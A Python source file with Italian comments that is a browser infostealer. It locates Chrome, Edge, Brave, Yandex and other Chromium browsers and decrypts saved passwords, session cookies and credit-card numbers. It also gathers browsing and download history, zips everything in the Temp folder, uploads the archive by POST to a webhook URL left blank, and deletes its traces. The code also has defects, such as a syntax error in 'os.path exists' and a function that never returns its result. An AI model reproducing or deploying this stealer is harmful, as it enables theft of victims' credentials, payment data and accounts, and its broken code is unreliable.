import os
import requests
import json
import base64
import sqlite3
import shutil
from Crypto.Cipher import AES
from datetime import datetime

# Funzione per ottenere il percorso dell'applicazione
def get_appdata_path(app_name):
    if os.name == 'nt':  # Windows
        return os.getenv('LOCALAPPDATA') + f'\\{app_name}\\User Data'
    else:  # Linux
        return os.path.expanduser(f"~/.config/{app_name}/Default")

# Variabili comuni
hook = ""
user = os.path.expanduser("~")
browsers = {
    'amigo': get_appdata_path('Amigo'),
    'torch': get_appdata_path('Torch'),
    'kometa': get_appdata_path('Kometa'),
    'orbitum': get_appdata_path('Orbitum'),
    'cent-browser': get_appdata_path('CentBrowser'),
    '7star': get_appdata_path('7Star/7Star'),
    'sputnik': get_appdata_path('Sputnik/Sputnik'),
    'vivaldi': get_appdata_path('Vivaldi'),
    'google-chrome-sxs': get_appdata_path('Google/Chrome SxS'),
    'google-chrome': get_appdata_path('Google/Chrome'),
    'epic-privacy-browser': get_appdata_path('Epic Privacy Browser'),
    'microsoft-edge': get_appdata_path('Microsoft/Edge'),
    'uran': get_appdata_path('uCozMedia/Uran'),
    'yandex': get_appdata_path('Yandex/YandexBrowser'),
    'brave': get_appdata_path('BraveSoftware/Brave-Browser'),
    'iridium': get_appdata_path('Iridium'),
}

# Funzione per ottenere il master key
def get_master_key(path):
    local_state_file = os.path.join(path, "Local State")

    if not os.path exists(local_state_file):
        return

    with open(local_state_file, "r", encoding="utf-8") as f:
        local_state = json.load(f)

    master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    master_key = master_key[5:]

    # Decrittazione del master key
    if os.name == 'nt':  # Windows
        from win32crypt import CryptUnprotectData
        master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
    else:  # Linux
        from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
        from cryptography.hazmat.primitives import hashes

        salt = master_key[3:15]
        kdf = PBKDF2HMAC(
            algorithm=hashes.SHA1(),
            iterations=1003,
            salt=salt,
            length=16,
        )
        master_key = base64.b64encode(kdf.derive(master_key)).decode("utf-8")

    return master_key

# Funzione per decrittare la password
def decrypt_password(buff, master_key):
    iv = buff[3:15]
    payload = buff[15:]
    cipher = AES.new(master_key, AES.MODE_GCM, iv)
    decrypted_pass = cipher.decrypt(payload)
    decrypted_pass = decrypted_pass[:-16].decode()

    return decrypted_pass

# Funzione per salvare i risultati in un file di testo
def save_results(browser_name, data_type, content):
    if not os.path.exists(os.path.join(user, 'AppData', 'Local', 'Temp', 'Browser')):
        os.mkdir(os.path.join(user, 'AppData', 'Local', 'Temp', 'Browser'))
    if not os.path.exists(os.path.join(user, 'AppData', 'Local', 'Temp', 'Browser', browser_name)):
        os.mkdir(os.path.join(user, 'AppData', 'Local', 'Temp', 'Browser', browser_name))
    if content is not None:
        file_path = os.path.join(user, 'AppData', 'Local', 'Temp', 'Browser', browser_name, f'{data_type}.txt')
        with open(file_path, 'w', encoding="utf-8") as file:
            file.write(content)

# Funzione per ottenere i dati di accesso
def get_login_data(path, profile, master_key):
    login_db = os.path.join(path, profile, 'Login Data')
    if not os.path.exists(login_db):
        return
    result = ""
    shutil.copy(login_db, os.path.join(user, 'AppData', 'Local', 'Temp', 'login_db'))
    conn = sqlite3.connect(os.path.join(user, 'AppData', 'Local', 'Temp', 'login_db'))
    cursor = conn.cursor()
    cursor.execute('SELECT action_url, username_value, password_value FROM logins')
    for row in cursor.fetchall():
        password = decrypt_password(row[2], master_key)
        result += f"""
        URL: {row[0]}
        Email: {row[1]}
        Password: {password}

        """
    conn.close()
    os.remove(os.path.join(user, 'AppData', 'Local', 'Temp', 'login_db'))
    return result

# Funzione per ottenere le informazioni sulle carte di credito
def get_credit_cards(path, profile, master_key):
    cards_db = os.path.join(path, profile, 'Web Data')
    if not os.path.exists(cards_db):
        return

    result = ""
    shutil.copy(cards_db, os.path.join(user, 'AppData', 'Local', 'Temp', 'cards_db'))
    conn = sqlite3.connect(os.path.join(user, 'AppData', 'Local', 'Temp', 'cards_db'))
    cursor = conn.cursor()
    cursor.execute(
        'SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted, date_modified FROM credit_cards')
    for row in cursor.fetchall():
        if not row[0] or not row[1] or not row[2] or not row[3]:
            continue

        card_number = decrypt_password(row[3], master_key)
        result += f"""
        Name Card: {row[0]}
        Card Number: {card_number}
        Expires:  {row[1]} / {row[2]}
        Added: {datetime.fromtimestamp(row[4])}

        """

    conn.close()
    os.remove(os.path.join(user, 'AppData', 'Local', 'Temp', 'cards_db'))
    return result

# Funzione per ottenere i dati dei cookie
def get_cookies(path, profile, master_key):
    cookie_db = os.path.join(path, profile, 'Network', 'Cookies')
    if not os.path.exists(cookie_db):
        return
    result = ""
    shutil.copy(cookie_db, os.path.join(user, 'AppData', 'Local', 'Temp', 'cookie_db'))
    conn = sqlite3.connect(os.path.join(user, 'AppData', 'Local', 'Temp', 'cookie_db'))
    cursor = conn.cursor()
    cursor.execute('SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies')
    for row in cursor.fetchall():
        if not row[0] or not row[1] or not row[2] or not row[3]:
            continue

        cookie = decrypt_password(row[3], master_key)

        result += f"""
        Host Key : {row[0]}
        Cookie Name : {row[1]}
        Path: {row[2]}
        Cookie: {cookie}
        Expires On: {row[4]}

        """

    conn.close()
    os.remove(os.path.join(user, 'AppData', 'Local', 'Temp', 'cookie_db'))
    return result

# Funzione per ottenere la cronologia del web
def get_web_history(path, profile):
    web_history_db = os.path.join(path, profile, 'History')
    result = ""
    if not os.path.exists(web_history_db):
        return

    shutil.copy(web_history_db, os.path.join(user, 'AppData', 'Local', 'Temp', 'web_history_db'))
    conn = sqlite3.connect(os.path.join(user, 'AppData', 'Local', 'Temp', 'web_history_db'))
    cursor = conn.cursor()
    cursor.execute('SELECT url, title, last_visit_time FROM urls')
    for row in cursor.fetchall():
        if not row[0] or not row[1] or not row[2]:
            continue
        result += f"""
        URL: {row[0]}
        Title: {row[1]}
        Visited Time: {row[2]}

        """
    conn.close()
    os.remove(os.path.join(user, 'AppData', 'Local', 'Temp', 'web_history_db'))
    return result

# Funzione per ottenere la cronologia dei download
def get_downloads(path, profile):
    downloads_db = os.path.join(path, profile, 'History')
    if not os.path.exists(downloads_db):
        return
    result = ""
    shutil.copy(downloads_db, os.path.join(user, 'AppData', 'Local', 'Temp', 'downloads_db'))
    conn = sqlite3.connect(os.path.join(user, 'AppData', 'Local', 'Temp', 'downloads_db'))
    cursor = conn.cursor()
    cursor.execute('SELECT tab_url, target_path FROM downloads')
    for row in cursor.fetchall():
        if not row[0] or not row[1]:
            continue
        result += f"""
        Download URL: {row[0]}
        Local Path: {row[1]}

        """

    conn.close()
    os.remove(os.path.join(user, 'AppData', 'Local', 'Temp', 'downloads_db'))

# Funzione per elencare i browser installati
def installed_browsers():
    results = []
    for browser, path in browsers.items():
        if os.path.exists(path):
            results.append(browser)
    return results

if __name__ == '__main__':
    available_browsers = installed_browsers()

    for browser in available_browsers:
        browser_path = browsers[browser]
        master_key = get_master_key(browser_path)

        save_results(browser, 'Saved_Passwords', get_login_data(browser_path, "Default", master_key))
        save_results(browser, 'Browser_History', get_web_history(browser_path, "Default"))
        save_results(browser, 'Download_History', get_downloads(browser_path, "Default"))
        save_results(browser, 'Browser_Cookies', get_cookies(browser_path, "Default", master_key))
        save_results(browser, 'Saved_Credit_Cards', get_credit_cards(browser_path, "Default", master_key))

    shutil.make_archive(os.path.join(user, 'AppData', 'Local', 'Temp', 'Browser'), 'zip', os.path.join(user, 'AppData', 'Local', 'Temp', 'Browser'))

    try:
        shutil.rmtree(os.path.join(user, 'AppData', 'Local', 'Temp', 'Browser'))
    except:
        pass

    with open(os.path.join(user, 'AppData', 'Local', 'Temp', 'Browser.zip'), "rb") as f:
        files = {"Browser.zip": (os.path.join(user, 'AppData', 'Local', 'Temp', 'Browser.zip'), f)}
        r = requests.post(hook, files=files)

    try:
        os.remove(os.path.join(user, "AppData", "Local", "Temp", "Browser.zip"))
    except:
        pass
